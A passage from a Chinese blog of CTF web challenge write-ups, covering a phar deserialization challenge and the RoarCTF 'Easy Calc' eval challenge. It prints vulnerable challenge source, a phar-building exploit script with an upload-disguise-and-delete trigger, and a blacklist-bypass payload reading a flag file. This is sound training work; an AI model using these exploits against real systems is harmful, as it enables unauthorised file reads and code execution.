class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们看到，其中有多个类的定义，其中<code>delete()</code>函数中的<code>unlink()</code>引起注意，因为这个函数在处理<code>phar</code>文件时会<strong>将序列化的内容反序列化</strong>，这一点在前面提供的第二个链接有讲到，还提到了其他的函数，如下:<br><img src="http://www.ggb0n.cool/images/BUUCTF-web26.png" alt=""><br>再看delete.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中<code>$file-&gt;delete()</code>时便执行了<code>unlink()</code>函数。</p>
<p>那么我们上传一个<code>phar</code>文件，再去删除它，此处便可以控制通过<code>phar://</code>执行了我们上传的<code>phar</code>文件，便将文件中序列化的内容反序列化了，利用这个部分，我们便可以构造<code>phar</code>文件，来读取flag文件了。</p>
<h3 id="构造phar文件"><a href="#构造phar文件" class="headerlink" title="构造phar文件"></a>构造phar文件</h3><p>网上找到了构造<code>phar</code>文件的脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"exp.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h3><p>首先上传构造好的<code>phar</code>文件，这里需要注意：<strong>phar文件上传的时候必须伪装成image文件</strong>，通过BP抓包上传：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web23.png" alt=""><br><img src="http://www.ggb0n.cool/images/BUUCTF-web24.png" alt=""><br>然后删除文件，此时抓包，然后把要删除的文件名改为<code>phar://phar.png/exp.txt</code>，然后即可拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web25.png" alt=""></p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>网上有说这道题跟<code>HTTP协议走私</code>有关联，之前看过http走私的文章，但我觉得的更多的考察的就是参数过滤的绕过还有对输入字符做限制时候的绕过。<br>不过这里可以再学习一下<a href="https://paper.seebug.org/1048/">http走私</a>，还学到了一些<a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a>的方法。</p>
<h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目查看源码发现<code>clac.php?num</code>被ban了，同时在<code>calc.php</code>中可以拿到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先对传参<code>num</code>进行了过滤，但是要想读出flag，又必须用<code>num</code>传参，这时候想到利用空格的绕过方法。补充一点知识：</p>
<blockquote>
<p>php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p>
</blockquote>
<p>也就是说利用<code>num</code>传参就可以了。<br>我们还看到<code>/</code>也被ban了，再想要查看目录下的内容，就需要借助一些系统函数了。利用<code>chr()</code>函数即可借助数字来构造被ban的字符，来最终读取flag，最终payload如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>))</span><br></pre></td></tr></table></figure>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey"> </i><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">CTF学习记录</a><span> </span><a class="article-more button is-small link-muted" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/">BUU刷题</a></div>  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted" href="/tags/CTF/">CTF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/web/">web</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/">哈希长度扩展攻击</a><span> </span><a class="article-more button is-small link-muted" href="/tags/RCE/">RCE</a><span> </span><a class="article-more button is-small link-muted" href="/tags/302%E8%B7%B3%E8%BD%AC/">302跳转</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">phar反序列化漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">反序列化逃逸漏洞</a><span> </span><a class="article-more button is-small link-muted" href="/tags/http%E5%8D%8F%E8%AE%AE%E8%B5%B0%E7%A7%81/">http协议走私</a><span> </span><a class="article-more button is-small link-muted" href="/tags/SSRF/">SSRF</a><span> </span><a class="article-more button is-small link-muted" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><span> </span><a class="article-more button is-small link-muted" href="/tags/user-ini%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">user.ini上传漏洞</a></div></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><!--!--><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="is-rounded" src="http://ggb0n.cool/images/header2.jpg" alt="ggb0n"></figure><p class="title is-size-4 is-block line-height-inherit">ggb0n</p><p class="is-size-6 is-block">一生一世，爱你一人。</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>伟大的中国</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">92</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ggb0n"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Weibo" href="https://weibo.com/u/5955623314"><i class="fab fa-weibo"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:gg.b0n@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="Next" href="https://15h3na0.xyz"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-white is-marginless" target="_blank" rel="noopener" title="RSS" href="http://ggb0n.cool/search.xml"><i class="fas fa-rss"></i></a></div><div><hr><p id="hitokoto">:D 一言句子获取中...</p><script type="text/javascript" defer>function getYiyan(){
                                $.getJSON("https://v1.hitokoto.cn/", function (data) {
                                if(data){
                                    $('#hitokoto').html("");
                                    $('#hitokoto').append("<strong style='color: #3273dc;'>"+data.hitokoto+"</strong>"+
                                    "<p>"+"来源《"+data.from+"》</p><p>提供者-"+data.creator+"</p>");
                                }});}
                                $(function (){getYiyan();$('#hitokoto').click(function(){getYiyan();})});</script></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><!--!--><div class="card widget"><div class="card-content"><h3 class="menu-label">Recent</h3><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-08T16:16:23.000Z">2020-04-09</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/09/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9CCNN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">卷积神经网络CNN入门</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-08T16:03:30.000Z">2020-04-09</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">机器学习基本知识</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-03T01:59:36.000Z">2020-04-03</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/">FTP服务器搭建及典型问题的解决</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">瞎捉摸的一些学习</a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/">FTP服务器搭建</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-01T12:16:27.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/obfs4%E7%BD%91%E6%A1%A5%E9%85%8D%E7%BD%AE%E6%8A%A5%E9%94%99%E7%9A%84%E8%A7%A3%E5%86%B3/">obfs4网桥配置报错的解决</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">瞎捉摸的一些学习</a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/">obfs4网桥搭建</a></p></div></article><article class="media"><div class="media-content size-small"><p><time dateTime="2020-04-01T02:07:31.000Z">2020-04-01</time></p><p class="title is-6"><a class="link-muted" href="/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/">golang编译项目的一个巨坑</a></p><p class="is-uppercase"><i class="fas fa-folder-open has-text-grey"> </i><a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/">瞎捉摸的一些学习</a> / <a class="link-muted" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/">obfs4网桥搭建</a></p></div></article></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><span class="level-start"><span class="level-item">CTF学习记录</span></span><span class="level-end"><span class="level-item tag">18</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">BUU刷题</span></span><span class="level-end"><span class="level-item tag">5</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/CTFHub%E5%88%B7%E9%A2%98/"><span class="level-start"><span class="level-item">CTFHub刷题</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"><span class="level-start"><span class="level-item">比赛划水</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">赛题复现</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li></ul></li><li><a class="level is-mobile is-marginless" href="/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">机器学习</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">瞎捉摸的一些学习</span></span><span class="level-end"><span class="level-item tag">4</span></span></a><ul class="mr-0"><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">FTP服务器搭建</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile is-marginless" href="/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"><span class="level-start"><span class="level-item">obfs4网桥搭建</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></li><a class="level is-mobile is-marginless" href="/categories/"><span class="level-start"><span class="level-item">查看全部&gt;&gt;</span></span></a></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile is-marginless" href="/archives/2020/04/"><span class="level-start"><span class="level-item">April 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile is-marginless" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li></ul></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag is-grey-lightest">14</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web/"><span class="tag">web</span><span class="tag is-grey-lightest">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag is-grey-lightest">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Cookie%E6%94%BB%E5%87%BB/"><span class="tag">Cookie攻击</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bypass-functions-disable/"><span class="tag">bypass functions_disable</span><span class="tag is-grey-lightest">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JWT%E4%BC%AA%E9%80%A0/"><span class="tag">JWT伪造</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E6%94%BB%E5%87%BB/"><span class="tag">RSA攻击</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><span class="tag">反序列化漏洞</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"><span class="tag">布尔盲注</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag is-grey-lightest">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSRF/"><span class="tag">SSRF</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SSTI/"><span class="tag">SSTI</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"><span class="tag">二次注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="tag">报错注入</span><span class="tag is-grey-lightest">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Machine-Learning/"><span class="tag">Machine Learning</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Neural-Network/"><span class="tag">Neural Network</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"><span class="tag">RSA共模攻击</span><span class="tag is-grey-lightest">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tor/"><span class="tag">Tor</span><span class="tag is-grey-lightest">2</span></a></div></div><div class="field is-grouped is-grouped-multiline"><a class="tags has-addons" href="/tags/"><span class="tag">查看全部&gt;&gt;</span></a></div></div></div></div><div class="card widget"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe to Updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=removeifFeedsId&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="removeifFeedsId" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button is-primary" type="submit" value="Subscribe"></div></div><p class="help">输入邮箱开始订阅，更博后邮件通知！</p></form></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/" alt="ggb0n&#039;s Blog" height="28"></a><p 